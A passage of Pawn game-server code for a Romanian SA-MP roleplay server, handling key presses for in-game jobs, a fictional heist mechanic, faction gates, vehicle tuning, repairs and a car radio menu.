								//SetPlayerAttachedObject(playerid, 4, 2109, 6, 0.4200, 0.1710, -0.1630, 150.5000, 0.0000, 113.7999, 1.0000, 1.0000, 1.0000);
								SetPlayerAttachedObject(playerid, 4, 2109, 1, 0.0000, 0.5090, -0.0020, 0.0000, 91.8999, 0.0000, 1.0000, 1.0000, 1.0000);
								SetPlayerSpecialAction(playerid, SPECIAL_ACTION_CARRY);
								ApplyAnimation(playerid, "CARRY", "liftup05", 4.1, 0, 1, 1, 0, 0);
								InHand[playerid] = true;
			    				showInfo(playerid, "Mergi la vehicul pentru a descarca mobila.~n~Nu uita sa apesi tasta ~y~Y ~w~pentru a descarca mobila in vehicul.", 6);
							}
						}
						return true;
					}
					else if(int==0) {
						if(GetVehicleDistanceFromPoint(JobVehicle[playerid], rx, ry, rz) > 5.0) return true;
						if(IsPlayerAttachedObjectSlotUsed(playerid, 4)&&InHand[playerid]&&CurseFacute[playerid]<=5) {
							switch(CurseFacute[playerid]) {
								case 1: {
									LumberjackObject[playerid][0] = CreateDynamicObject(2133,0.0,0.0,-1000.0,0.0,0.0,0.0,-1,-1,-1,300.0,300.0);
		    						AttachDynamicObjectToVehicle(LumberjackObject[playerid][0], JobVehicle[playerid], -0.670, 1.801, -0.240, 0.000, 0.000, 0.000);

									LumberObj[playerid][1] = CreateDynamicObject(1758, 941.867615, 2118.786621, 1011.161865, 0.000000, 0.000000, 0.000000, -1, -1, -1, 400.000000, 400.000000);
								}
								case 2: {
									LumberjackObject[playerid][1] = CreateDynamicObject(1758,0.0,0.0,-1000.0,0.0,0.0,0.0,-1,-1,-1,300.0,300.0);
		    						AttachDynamicObjectToVehicle(LumberjackObject[playerid][1], JobVehicle[playerid], 0.170, 1.881, -0.290, 0.000, 0.000, 0.000);
									
									LumberObj[playerid][2] = CreateDynamicObject(2029, 941.867615, 2118.786621, 1011.161865, 0.000000, 0.000000, 0.000000, -1, -1, -1, 400.000000, 400.000000);
									//LumberObj[playerid][2] = CreateDynamicObject(2029,0.0,0.0,-1000.0,0.0,0.0,0.0,-1,-1,-1,300.0,300.0);
								}
								case 3: {
		    						LumberjackObject[playerid][2] = CreateDynamicObject(2029,0.0,0.0,-1000.0,0.0,0.0,0.0,-1,-1,-1,300.0,300.0);
		    						AttachDynamicObjectToVehicle(LumberjackObject[playerid][2], JobVehicle[playerid], -0.500, 0.430, -0.290, 0.000, 0.000, 0.000);

									LumberObj[playerid][3] = CreateDynamicObject(1723, 941.867615, 2118.786621, 1011.161865, 0.000000, 0.000000, 0.000000, -1, -1, -1, 400.000000, 400.000000);
								}
								case 4: {
		    						LumberjackObject[playerid][3] = CreateDynamicObject(1723,0.0,0.0,-1000.0,0.0,0.0,0.0,-1,-1,-1,300.0,300.0);
		   						 	AttachDynamicObjectToVehicle(LumberjackObject[playerid][3], JobVehicle[playerid], -1.000, -2.952, -0.350, 0.000, 0.000, 0.000);

									LumberObj[playerid][4] = CreateDynamicObject(2109, 941.867615, 2118.786621, 1011.161865, 0.000000, 0.000000, 0.000000, -1, -1, -1, 400.000000, 400.000000);
								}
								case 5: {
		    						LumberjackObject[playerid][4] = CreateDynamicObject(2109,0.0,0.0,-1000.0,0.0,0.0,0.0,-1,-1,-1,300.0,300.0);
		   						 	AttachDynamicObjectToVehicle(LumberjackObject[playerid][4], JobVehicle[playerid], -0.060, -1.221, 0.000, 0.000, 0.000, 0.000);
									
									//continuare brou
									StatusJob[playerid] = 1;
									new const bizz_type[1] = {6};
									new t=random(6969)%sizeof bizz_type, biz = BizzTypeID[bizz_type[t]][random(GpsBizzType[bizz_type[t]])];

									format(gString, 256, "Ai incarcat cu succes mobila. Du-te la locatia indicata pe harta pentru a descarca marfa.~n~~y~(distanta: %.2fm)", GetPlayerDistanceFromPoint(playerid, BizzInfo[biz][bEntranceX], BizzInfo[biz][bEntranceY], BizzInfo[biz][bEntranceZ]));
			    					showInfo(playerid, gString, 6);
			    					CP[playerid] = 802;
			    					SetPlayerCheckpoint(playerid, BizzInfo[biz][bEntranceX], BizzInfo[biz][bEntranceY], BizzInfo[biz][bEntranceZ], 3.0);
									BlockEnter[playerid] = true;
									CurseFacute[playerid] = 0;
								}
							}
							RemovePlayerAttachedObject(playerid, 4);
							SetPlayerSpecialAction(playerid, SPECIAL_ACTION_NONE);
							InHand[playerid] = false;
							return true;
						}
					}


					if(!InHand[playerid]) return true;
					if(GetVehicleDistanceFromPoint(JobVehicle[playerid], rx, ry, rz) > 5.0) return true;
					RemovePlayerAttachedObject(playerid, 3);
					SetPlayerSpecialAction(playerid, SPECIAL_ACTION_NONE);
					InHand[playerid] = false;
					BagTime[playerid] = 0;
					LumberObj[playerid][CurseFacute[playerid]] = CreateDynamicObject(1463, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0);
					if(SpecialJobWorking[playerid]&&!IsValidDynamicObject(LumberjackObject[playerid][0])) {
						switch(CurseFacute[playerid]++) {
							case 0: AttachDynamicObjectToVehicle(LumberObj[playerid][0], JobVehicle[playerid], 0.000, 1.130, 0.000, 0.000, 0.000, 0.000);
							case 1: AttachDynamicObjectToVehicle(LumberObj[playerid][1], JobVehicle[playerid], 0.000, -0.450, 0.000, 0.000, 0.000, 0.000);
							case 2: AttachDynamicObjectToVehicle(LumberObj[playerid][2], JobVehicle[playerid], 0.100, -2.092, 0.000, 0.000, 0.000, 0.000);
							case 3: AttachDynamicObjectToVehicle(LumberObj[playerid][3], JobVehicle[playerid], 0.110, -3.683, 0.000, 0.000, 0.000, 0.000);
							case 4: AttachDynamicObjectToVehicle(LumberObj[playerid][4], JobVehicle[playerid], 0.000, 0.329, 0.570, 0.000, 0.000, 0.000);
							case 5: {
								AttachDynamicObjectToVehicle(LumberObj[playerid][5], JobVehicle[playerid], 0.000, -2.952, 0.570, 0.000, 0.000, 0.000);
								SendClientMessage(playerid, COLOR_WHITE, "{75db3d}(Job) {FFFFFF}Ai incarcat cu succes cei 6 copaci. Transporta copacii la fabrica pentru ca acestia sa fie transformati in mobilier.");
								SCMf(playerid, COLOR_WHITE, "{75db3d}(Job) {FFFFFF}Checkpoint plasat catre destinatie: distanta: %.2fm.", GetPlayerDistanceFromPoint(playerid, -722.5193,-127.6918,68.3033));
								format(gString, 256, "Ai incarcat cu succes cei 6 copaci. Transporta copacii la fabrica pentru ca acestia sa fie~n~transformati in mobilier.~n~~y~(distanta: %.2fm)", GetPlayerDistanceFromPoint(playerid, -64.2435,-1120.9960,1.0949));
	    						showInfo(playerid, gString, 6);
								SetPlayerCheckpoint(playerid, -722.5193,-127.6918,68.3033, 5.0);
								CP[playerid] = 801;
							}
						}
					} else {
						switch(CurseFacute[playerid]++) {
							case 0: AttachDynamicObjectToVehicle(LumberObj[playerid][0], JobVehicle[playerid], -0.004999, -1.034999, 0.130000, 0.000000, 0.000000, 0.000000); 
							case 1: AttachDynamicObjectToVehicle(LumberObj[playerid][1], JobVehicle[playerid], -0.009999, -1.869998, 0.000000, 0.000000, 0.000000, 0.000000); 
							case 2: {
								AttachDynamicObjectToVehicle(LumberObj[playerid][2], JobVehicle[playerid], 0.019999, -1.569998, 0.599999, 0.000000, 0.000000, 0.000000); 
								SendClientMessage(playerid, COLOR_WHITE, "{75db3d}(Job) {FFFFFF}Mergi la checkpoint-ul plasat pe minimap pentru a transporta lemnele.");
								SetPlayerCheckpoint(playerid, -64.2435,-1120.9960,1.0949, 5.0);
								CP[playerid] = 702;
							}
						}
					}
					return true;
				}
				case 4: {
					if(!InHand[playerid]) return true;
					if(GetVehicleDistanceFromPoint(JobVehicle[playerid], rx, ry, rz) > 5.0) return true;
					RemovePlayerAttachedObject(playerid, 3);
					InHand[playerid] = false;
					CurseFacute[playerid] += BagTime[playerid];
					CheckMission(playerid, 2);
					if(CurseFacute[playerid]>=25) {
						PlayerTextDrawSetString(playerid, GarbagePTD, "~p~garbage man job~n~~g~~h~25/25 ~w~~h~kg of garbage");
						SendClientMessage(playerid, COLOR_YELLOW, "Du-te la checkpoint-ul de pe mapa pentru a primi banii pentru munca depusa!");
						SetPlayerRaceCheckpoint(playerid, 1, 2570.1870,2781.7876,10.8203, 0.0, 0.0, 0.0, 6.0);
						CP[playerid] = 704;
						return true;
					}
					format(gString, 128, "~p~garbage man job~n~~g~~h~%d/25 ~w~~h~kg of garbage", CurseFacute[playerid]);
					PlayerTextDrawSetString(playerid, GarbagePTD, gString);
					new t = BagTime[playerid] = random(sizeof trashObj); gString[0] = (EOS);
					format(gString, 128, "Du-te la punctul ~r~rosu~w~~h~ de pe mapa pentru a lua sacul cu gunoi~n~(~y~%s, %.2fm~w~~h~)", Get3DZone(trashObj[t][0], trashObj[t][1], trashObj[t][2]), GetPlayerDistanceFromPoint(playerid, trashObj[t][0], trashObj[t][1], trashObj[t][2]));
			    	showInfo(playerid, gString, 7);
			    	SetPlayerRaceCheckpoint(playerid, 1, trashObj[t][0], trashObj[t][1], trashObj[t][2], 0.0, 0.0, 0.0, 1.0);
			   		CP[playerid] = 703;
			   		return true;
				}
				case 6: {
					if(PlayerToPoint(3, playerid, 1490.8301,1375.7360,-10.7238) && !InHand[playerid]) {
						showInfo(playerid, "waiting...");
						SetTimerEx("waitingDrugs", 5000, false, "dd", playerid,1);
						ApplyAnimation(playerid, "BOMBER", "BOM_Plant", 5.0, 0, 0, 0, 0, 5000);
						InHand[playerid] = true;
						return true;
					}
					if(PlayerToPoint(30, playerid, -1684.1174,1033.9836,45.2109) && InHand[playerid]) {
						showInfo(playerid, "waiting...");
						SetTimerEx("waitingDrugs", 5000, false, "dd", playerid,2);
						ApplyAnimation(playerid, "BOMBER", "BOM_Plant", 5.0, 0, 0, 0, 0, 5000);
						InHand[playerid] = false;
						JobWorking[playerid] = false;
						return true;
					}
					return true;
				}
				case 7: {
					if(!IsPlayerInVehicle(playerid, JobVehicle[playerid]))
						return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu esti in vehiculul de la job.");

					if(GetVehicleModel(JobVehicle[playerid])!=486 || !InHand[playerid])
						return true;

					new id = jobWork[playerid];
					if(!ProxDetectorS(10.0, playerid, id))
						return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu esti langa el.");

					new const Float:pos_work[3][3] = {{606.4033,868.7328,-40.1690}, {638.4946,856.0146,-40.1565}, {637.7477,827.3764,-40.1763}}, r=random(sizeof pos_work);
					SetPlayerCheckpoint(playerid, pos_work[r][0], pos_work[r][1], pos_work[r][2], 5.0);
					CP[playerid] = 707;

					InHand[playerid] = false;
					SendClientMessage(playerid, COLOR_YELLOW, "Piatra transferata! Mergi la checkpoint pentru a lua alta piatra.");
					
					SetPlayerCheckpoint(id, -151.1493,1442.9177,21.8566, 5.0);
					SendClientMessage(id, COLOR_YELLOW, "Mergi la checkpoint pentru a descarca piatra.");
					CP[id] = 708;
					return true;
				}
				case 9: {
					if(JobWorking[playerid]!=2) return true;
					new Float:vx,Float:vy,Float:vz;
					GetVehiclePos(JobVehicle[playerid], vx, vy, vz);
					if(GetPlayerDistanceFromPoint(playerid, vx, vy, vz) >= 4) return true;
					if(InHand[playerid]) {
						RemovePlayerAttachedObject(playerid, 5);
						InHand[playerid] = false;
						SetPlayerSpecialAction(playerid, SPECIAL_ACTION_NONE);
					} else {
						InHand[playerid] = true;
						SetPlayerAttachedObject(playerid, 5, 2814, 6, 0.0739, -0.0009, -0.1570, 68.5999, -165.9999, -10.6999, 1.0000, 1.0000, 1.0000);
						SetPlayerSpecialAction(playerid, SPECIAL_ACTION_CARRY);
					}
					return true;
				}
				case 10: {
					if(GetVehicleDistanceFromPoint(JobVehicle[playerid], rx, ry, rz) > 5.0) return true;				
					if(InHand[playerid]) return true;
					if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu poti ridica coletul dintr-un vehicul!");
					InHand[playerid] = true;
					SendClientMessage(playerid, COLOR_LGREEN, "Colet ridicat!");
					SetPlayerSpecialAction(playerid, SPECIAL_ACTION_CARRY);
					SetPlayerAttachedObject(playerid, 1, 1220, 1, 0.299822, 0.663485, -0.036337, 184.311355, 90.004089, 0.000000, 1.000000, 1.000000, 1.000000);
					return true;
				}
				case 15: {
					if(IsPlayerInAnyVehicle(playerid)) return true;
					if(CP[playerid]!=0&&CP[playerid]!=717) return true;
					switch(InHand[playerid]) {
						case false: {
							switch(BizzInfo[BagTime[playerid]][bType]) {
								case 4: SetPlayerAttachedObject(playerid, 4, 1220, 1, 0.2270, 0.4790, -0.0170, 0.0000, -92.4999, 0.0000, 1.0000, 0.7830, 0.6720);
								case 19: SetPlayerAttachedObject(playerid, 4, 1582, 1, 0.0000, 0.5090, -0.0020, 0.0000, 91.8999, 0.0000, 1.0000, 1.0000, 1.0000);
								case 8: SetPlayerAttachedObject(playerid, 4, 19811, 1, 0.0150, 0.4600, -0.0639, 0.0000, 93.6999, 0.0000, 1.2970, 1.1950, 1.0000);
							}
							InHand[playerid] = true;
							SetPlayerSpecialAction(playerid, SPECIAL_ACTION_CARRY);
						}
						case true: {
							RemovePlayerAttachedObject(playerid, 4);
							if(!CP[playerid]) {
								SendClientMessage(playerid, COLOR_WHITE, "{75db3d}(Glovo Job) {FFFFFF}Du-te la punctul rosu pe mapa pentru a livra mancarea.");
								new h = RandomEx(1, sql_houses);
								SetPlayerCheckpoint(playerid, HouseInfo[h][hEntrancex], HouseInfo[h][hEntrancey], HouseInfo[h][hEntrancez], 2.5);
								CP[playerid] = 717;
							}
							InHand[playerid] = false;
							SetPlayerSpecialAction(playerid, SPECIAL_ACTION_NONE);
						}
					}
					return true;
				}
			}
		}

		if PlayerInfo[playerid][pJob] || PickupInfo[PlayerPickup[playerid]][pkType] != 5 *then return true;
		new j = PickupInfo[PlayerPickup[playerid]][pkID];
        if IsPlayerInAnyVehicle(playerid) *then
        	return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu poti aceasta comanda dintr-un vehicul!");
        
        if !PlayerToPoint(3, playerid, JobInfo[j][jPosX], JobInfo[j][jPosY], JobInfo[j][jPosZ]) *then
        	return true;

		if PlayerInfo[playerid][pLevel] < JobInfo[j][jLevel] *then
			return SCMf(playerid, COLOR_WHITE, "Ai nevoie de level %d pentru a lua jobul %s.",  JobInfo[j][jLevel], JobInfo[j][jName]);

		CurseFacute[playerid] =fishCount[playerid]=0;
		SCMf(playerid, -1, "Your new job is now %s. Use (/help > 'Job commands') to see commands.", JobInfo[j][jName]);
		PlayerInfo[playerid][pJob] = j;
		UpdateVar(playerid, "Job", PlayerInfo[playerid][pJob]);
		if(PlayerInfo[playerid][pTutorial] == 4) return JobTutorial(playerid, j);
	}
	if(newkeys & KEY_CROUCH) {
		if p_rob[playerid][r_in_rob] *then {
			new _b = p_rob[playerid][r_biz_type]!=18?p_rob[playerid][r_biz_type]:9;
			if camera_obj[playerid][_b][0]==INVALID_OBJECT_ID&&camera_obj[playerid][_b][1]==INVALID_OBJECT_ID&&!InHand[playerid] *then {
				if(!PlayerToPoint(1, playerid, SafePos[_b][0], SafePos[_b][1], SafePos[_b][2])) return true;
				if p_rob[playerid][r_backs]>=2 *then return true;
				SetPlayerAttachedObject(playerid, 4, 1550, 1, 0.024558, -0.279748, -0.060589, 6.105677, 137.291320, 147.132202, 1.019888, 1.000000, 1.000000);
				OnePlayAnim(playerid,"GANGS","shake_carSH",4.0,0,0,0,0,0);
				InHand[playerid] = true;
				if !p_rob[playerid][r_backs] *then SetTimerEx(#give_rob_wanted, 10000, false, #i, playerid);			
				p_rob[playerid][r_backs]++;
				SendClientMessage(playerid, -1, "{47A028}(Rob) {ffffff}Acum trebuie sa duci sacul la masina in spatele vehicului (trebuie sa apesi tasta 'C')");
				return true;
			}
			new veh_rob = p_rob[playerid][r_coPlayer]==-1?p_rob[playerid][r_vehicle]:p_rob[p_rob[playerid][r_coPlayer]][r_vehicle];
			if IsPlayerNearVehicle(playerid, veh_rob, 5) && InHand[playerid] *then {
				RemovePlayerAttachedObject(playerid, 4);
				InHand[playerid] = false;
				if(p_rob[playerid][r_backs]!=2) SendClientMessage(playerid, -1, "{47A028}(Rob) {ffffff}Mai ai de luat un sac din seif.");
				else {
					new _x = p_rob[playerid][r_actor];
					if(p_rob[playerid][r_coPlayer]==-1) {
    					SCMf(playerid, -1, "{47A028}(Rob) {ffffff}Du-te la checkpoint-ul marcat pentru a transporta sacii la Welmbley. (%.1fm)", GetPlayerDistanceFromPoint(playerid, rob_actor_pos[_x][0], rob_actor_pos[_x][1], rob_actor_pos[_x][2]));
    					SetPlayerCheckpoint(playerid, rob_actor_pos[_x][0], rob_actor_pos[_x][1], rob_actor_pos[_x][2], 5.0);
    					CP[playerid] = 733;
    				} else {
    					new id = p_rob[playerid][r_coPlayer];
						SCMf(id, -1, "{47A028}(Rob) {ffffff}Du-te la checkpoint-ul marcat pentru a transporta sacii la Welmbley. (%.1fm)", GetPlayerDistanceFromPoint(id, rob_actor_pos[_x][0], rob_actor_pos[_x][1], rob_actor_pos[_x][2]));
    					SetPlayerCheckpoint(id, rob_actor_pos[_x][0], rob_actor_pos[_x][1], rob_actor_pos[_x][2], 5.0);
    					CP[id] = 733;
    				}
				}
				return true;
			}
		}
		if PlayerToPoint(15, playerid, 2616.28882, 592.16779, 6.00274) *then
			return CreateDynamicObject(980, 2616.28882, 592.16779, 6.00274,   0.00000, 0.00000, 3.59996, 0, 0, -1),
			MoveDynamicObject(gate_mipol, 2616.28882, 592.16779, 6.0, 2.0, 0.00000, 0.00000, 3.59996),
			SetTimer("close_gate_mipol", 9000, false);

		// CreateDynamicObject(968, 2637.85864, 524.35968, 7.05800,   180.00000, 180.00000, 0.30000, 0, 0, -1); bara mipol
		switch(PlayerInfo[playerid][pMember]) {
    		case 1,2,3,14,19: {
				if(PlayerToPoint(15, playerid,1588.6552, -1637.9025, 15.0358)) {
					MoveDynamicObject(gatelspd,1596.7352,-1637.9025, 15.0358,2);
					SetTimer("lspdgateclose" ,9000 ,false);
					return true;
				}
				if(PlayerToPoint(15, playerid,135.2833, 1941.3331, 21.6932)) {
					MoveDynamicObject(gateng,122.0023, 1941.4100, 21.6932,2);
					SetTimer("nggateclose" ,9000 ,false);
					return true;
				}
				if(PlayerToPoint(15, playerid,286.02518, 1822.32275, 20.09154)) {
					MoveDynamicObject(gateng2,286.06107, 1834.01367, 20.09154,2);
					SetTimer("nggateclose2" ,9000 ,false);
					return true;
				}
				if(PlayerToPoint(15, playerid,1544.7007, -1630.7527, 13.2983)) {
					MoveDynamicObject(lspdbar,1544.7007, -1630.7527, 13.2983,1,0.0000, 0.0000, 90.0000);
					SetTimer("lspdbarclose" ,9000 ,false);
					return true;
				}
				if(PlayerToPoint(15, playerid,2293.8513, 2497.67554, 4.53215)) {
					MoveDynamicObject(gatelvpd[0], 2293.8513, 2497.6755, -2, 5.0);
					SetTimerEx("LVPDGates", 5000, false, "i", 1);
					return true;
				}		   
				if(PlayerToPoint(15, playerid,2335.2009, 2443.6992, 1.8997)) {
					MoveDynamicObject(gatelvpd[1], 2335.2009, 2443.6992, 1.8997, 5.0);
					SetTimerEx("LVPDGates", 5000, false, "i", 2);
					return true;
				}	   
				if(PlayerToPoint(15, playerid, 2238.2146, 2450.2695, 10.6961)) {
					MoveDynamicObject(gatelvpd[2], 2238.21460, 2450.26953, 10.69610, 1, 0.00000, 0.00000, 90.00000);
					SetTimerEx("LVPDGates", 5000, false, "i", 3);
					return true;
				}
				if(PlayerToPoint(15, playerid,-1630.9342,687.8298,7.1875)) {
					MoveDynamicObject(gatesfpd, -1631.858887, 688.209167, 3.2950, 5.0, 0.000000, 0.000000, 181.019974);
					SetTimer("close_sf_gate" , 5000 ,false);
					return true;
				}
				if(PlayerToPoint(15, playerid,-1572.20325, 658.64032, 7.01500)) {
					MoveDynamicObject(sfpdbar, -1572.20325, 658.64032, 7.01500, 1, 180.00000, 180.00000, 90.00000);
					SetTimer("sfpd_close_bar", 9000, false);
					return true;
				}
			}
			case 8: {
				if(PlayerToPoint(13, playerid, 2423.8899, -2090.3191, 12.5429)) {
					if(GateStatus == 0) {
						GateStatus = 1;
						MoveDynamicObject(ttcgate[0], 2423.8462, -2074.8150, 15.3476, 3.0);
						MoveDynamicObject(ttcgate[1], 2423.8462, -2103.9908, 15.3476, 3.0);
						SetTimer("ResetGates", 3000, false);
					}
				}
			}
			case 22: {
				if(PlayerToPoint(13, playerid, -2430.01440, 498.11340, 25.69479)) {
					if(GateStatus == 0) {
						GateStatus = 1;
						MoveDynamicObject(ttcgate[2], -2430.01440, 498.11340, 25.69479, 3.0, 0.00000, 0.00000, 204.11998);
						SetTimer("ResetGates1", 3000, false);
					}
				}
			}
		}
		if GetPlayerState(playerid)!=PLAYER_STATE_DRIVER *then return true;
		new idd,i=-1;
		if(GarageArea[playerid]!=-1) {
			if(PlayerInfo[playerid][pHouse]!=GarageInfo[GarageArea[playerid]][gHouses]) return true;
			if((idd = PersonalCar(playerid))==-1) return true;
			if(CarInfo[idd][cGarage]!=-1) return SendClientMessage(playerid, COLOR_LGREEN, "ERROR: This vehicle is already spawned in this garage.");
			SCMf(playerid, COLOR_CLIENT, "* Your %s has been parked in garage #%d.", GetVehicleName(CarInfo[idd][cModel]), GarageInfo[GarageArea[playerid]][gID]);
			DestroyPlayerCar(idd);
			CarInfo[idd][cGarage] = GarageArea[playerid];
			_query("UPDATE `cars` SET `Garage` = '%i' WHERE `ID` = '%i'", GarageArea[playerid], CarInfo[idd][cID]);
		}
		idd = FindSpawnID(GetPlayerVehicleID(playerid));
		if idd != -1 *then {
			if CarInfo[idd][Userid]==PlayerInfo[playerid][pSQLID]||(CarInfo[idd][cClan]==PlayerInfo[playerid][pClan]&&PlayerInfo[playerid][pClan]) *then {
				i=-1;
				while(++i<6) {
					if !PlayerToPoint(3, playerid, TunningPos[i][0], TunningPos[i][1], TunningPos[i][2]) *then 
						continue;

					if i < 2 *then {
						IsStageUpgrade(playerid, idd);
						SetPlayerCameraPos(playerid, TunningCameraPos[i][0], TunningCameraPos[i][1], TunningCameraPos[i][2]);
						return SetPlayerCameraLookAt(playerid, TunningCameraPosLook[i][0], TunningCameraPosLook[i][1], TunningCameraPosLook[i][2]);
					}

					if i == 4 *then {
						IsStageUpgrade(playerid, idd);
						SetPlayerCameraPos(playerid, TunningCameraPos[i][0], TunningCameraPos[i][1], TunningCameraPos[i][2]);
						return SetPlayerCameraLookAt(playerid, TunningCameraPosLook[i][0], TunningCameraPosLook[i][1], TunningCameraPosLook[i][2]);
					}	

					if i == 5 *then {
						if !CarInfo[idd][cVip] *then
							return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Vehiculul tau nu este 'Vip Plus'!");

						if(CarInfo[idd][cNeon] != 0) SendClientMessage(playerid, COLOR_LIGHTGREEN, "ATENTIE: {FFFFFF}Ai deja un set de neoane iar daca iti vei cumpara le vei pierde pe cele actuale!");
						return ShowPlayerDialog(playerid, DIALOG_NEON, DIALOG_STYLE_TABLIST_HEADERS, "Buy neon:", !CarInfo[idd][cClan] ? "Neon Type\tValue\n{FFFFFF}White\t169 premium points\n{ff00c9}Pink\t{FFFFFF}269 premium points\n{fff000}Yellow\t{FFFFFF}369 premium points\n{64ff00}Green\t{FFFFFF}469 premium points\n{0046ff}Blue\t{FFFFFF}569 premium points\n{ff0400}Red\t{FFFFFF}669 premium points\nSpecial Neon\t{FFFFFF}1690 premium points":"Neon Type\tValue\n{FFFFFF}White\t{FFFFFF}169 premium points\n{ff00c9}Pink\t{FFFFFF}269 premium points\n{fff000}Yellow\t{FFFFFF}369 premium points\n{64ff00}Green\t{FFFFFF}469 premium points\n{0046ff}Blue\t{FFFFFF}569 premium points\n{ff0400}Red\t{FFFFFF}669 premium points", "Ok", "Close");
					}

					if !CarInfo[idd][cVip] *then
						return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Vehiculul tau nu este 'Vip Plus'!");

					if(CarInfo[idd][cNeon] != 0) SendClientMessage(playerid, COLOR_LIGHTGREEN, "ATENTIE: {FFFFFF}Ai deja un set de neoane iar daca iti vei cumpara le vei pierde pe cele actuale!");
					return ShowPlayerDialog(playerid, DIALOG_NEON, DIALOG_STYLE_TABLIST_HEADERS, "Buy neon:", !CarInfo[idd][cClan] ? "Neon Type\tValue\n{FFFFFF}White\t169 premium points\n{ff00c9}Pink\t{FFFFFF}269 premium points\n{fff000}Yellow\t{FFFFFF}369 premium points\n{64ff00}Green\t{FFFFFF}469 premium points\n{0046ff}Blue\t{FFFFFF}569 premium points\n{ff0400}Red\t{FFFFFF}669 premium points\nSpecial Neon\t{FFFFFF}1690 premium points":"Neon Type\tValue\n{FFFFFF}White\t{FFFFFF}169 premium points\n{ff00c9}Pink\t{FFFFFF}269 premium points\n{fff000}Yellow\t{FFFFFF}369 premium points\n{64ff00}Green\t{FFFFFF}469 premium points\n{0046ff}Blue\t{FFFFFF}569 premium points\n{ff0400}Red\t{FFFFFF}669 premium points", "Ok", "Close");
				}
			}
		}
		i=-1;
		while(++i<5) {
			if !PlayerToPoint(5.0, playerid, pnsPos[i][0], pnsPos[i][1], pnsPos[i][2]) *then continue;
			PnsTimer[playerid] = gettime()+5;
			SetVehiclePos(GetPlayerVehicleID(playerid), pnsPos[i+5][0], pnsPos[i+5][1], pnsPos[i+5][2]);
			SetVehicleZAngle(GetPlayerVehicleID(playerid), pnsPos[i+5][3]);
			GetVehicleHealth(GetPlayerVehicleID(playerid), VehicleHealth[playerid]);
			new const Float:cameraPNS[5][6]=
			{{1952.595947, 2162.537353, 18.230276, 1957.215820, 2162.635986, 16.320505},
			{1025.293701, -1042.417480, 37.579189, 1025.212280, -1037.751464, 35.784229},
			{489.972778, -1721.321533, 15.203684, 489.272979, -1726.145019, 14.088150},
			{720.085388, -477.392913, 22.404644, 720.090820, -472.690307, 20.705978},
			{2083.770019, -1831.646362, 18.792591, 2079.164794, -1831.622070, 16.845499}};
			SetPlayerCameraPos(playerid, cameraPNS[i][0], cameraPNS[i][1], cameraPNS[i][2]);
			SetPlayerCameraLookAt(playerid, cameraPNS[i][3], cameraPNS[i][4], cameraPNS[i][5]);
			new money = floatround((1000.0-VehicleHealth[playerid])*7.5),carid,Float:procent=100.0-((VehicleHealth[playerid]/1000.0)*100.0);
			if((carid=FindSpawnID(GetPlayerVehicleID(playerid))) != -1) {
				if(CarInfo[carid][cVip]) {
					money = floatround((2000.0-VehicleHealth[playerid])*7.5);
					procent=100.0-((VehicleHealth[playerid]/2000.0)*100.0);
				}
			}
			for(new h = 0; h < GpsBizzType[17]; h++) {
				idd = BizzTypeID[17][h];
				if(!PlayerToPoint(15.0, i,BizzInfo[idd][bEntranceX], BizzInfo[idd][bEntranceY], BizzInfo[idd][bEntranceZ])) continue;
				GivePlayerCash(playerid, -money);
				BizzInfo[idd][bBalance] += money;								
				break;
			}
			SCMf(playerid, -1, "{0B8C00}(PNS) {FFFFFF}Vei plati $%d pentru repararea vehicului tau. (%.0f%s avariat)", money, procent, "%%");
			LastPns[playerid] = i;
			TogglePlayerControllable(playerid, false);
			break;
		}
	}
    if(newkeys & KEY_CTRL_BACK) {
		if GetPlayerState(playerid)!=PLAYER_STATE_DRIVER *then return true;
		if LastPns[playerid]!=-1 *then return true;
    	gString="Nume\tAscultatori\n{FF3838}Turn OFF Radio\n";
		for(new i = 1; i < sizeof(RadioNames); i++) {
			format(gQuery, 80, "%s\t%d\n", RadioNames[i], ListenThisRadio(i));
			strcat(gString, gQuery);
		}
		ShowPlayerDialog(playerid, DIALOG_CARRADIO, DIALOG_STYLE_TABLIST_HEADERS, "Car Radio", gString, "Ok", "Close");
	}
   	if(newkeys & KEY_WALK) {
		if(Spectate[playerid]!=-1) return TogglePlayerSpectating(playerid, false);
		if(InHand[playerid]&&JobWorking[playerid]&&PlayerInfo[playerid][pJob]==3) { return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu poti face acest lucru cand ai lemnele in mana."); }
		if(SpecialJobWorking[playerid] && PlayerInfo[playerid][pJob] == 3 && JobWorking[playerid] && CurseFacute[playerid] < 6) {
			for(new i=0,j = sizeof g_Tree;i<j;i++) if(PlayerToPoint(1.5, playerid, g_Tree[i][0], g_Tree[i][1], g_Tree[i][2]) && TreeObj[playerid][i]) {
        		ClearAnimations(playerid);
        		ApplyAnimation(playerid, "CHAINSAW", "csaw_part", 4.0, 1, 1, 1, 1, 0);
        		SetPlayerAttachedObject(playerid, 3, 341, 6, 0.0000, -0.0170, 0.0000, 0.0000, 0.0000, 0.0000, 1.0000, 1.0000, 1.0000);
           		GameTextForPlayer(playerid, "CUTTING..", 7000, 3);
        		SetTimerEx("cutTree", 5000, false, "iii", playerid, i, TreeObj[playerid][i]);
        		TreeObj[playerid][i] = 0;
        		SetCameraBehindPlayer(i);
        		break;
        	}
		} else if(!SpecialJobWorking[playerid] && PlayerInfo[playerid][pJob] == 3 && JobWorking[playerid] && CurseFacute[playerid] < 3) {
			for(new i=0,j = sizeof g_Tree;i<j;i++) if(PlayerToPoint(1.5, playerid, g_Tree[i][0], g_Tree[i][1], g_Tree[i][2]) && TreeObj[playerid][i]) {
        		ClearAnimations(playerid);
        		ApplyAnimation(playerid, "CHAINSAW", "csaw_part", 4.0, 1, 1, 1, 1, 0);
        		SetPlayerAttachedObject(playerid, 3, 341, 6, 0.0000, -0.0170, 0.0000, 0.0000, 0.0000, 0.0000, 1.0000, 1.0000, 1.0000);
           		GameTextForPlayer(playerid, "CUTTING..", 7000, 3);
        		SetTimerEx("cutTree", 5000, false, "iii", playerid, i, TreeObj[playerid][i]);
        		TreeObj[playerid][i] = 0;
        		SetCameraBehindPlayer(i);
        		break;
        	}
		}
	}
   	if(newkeys & KEY_NO) {
		LockCarFunction(playerid);
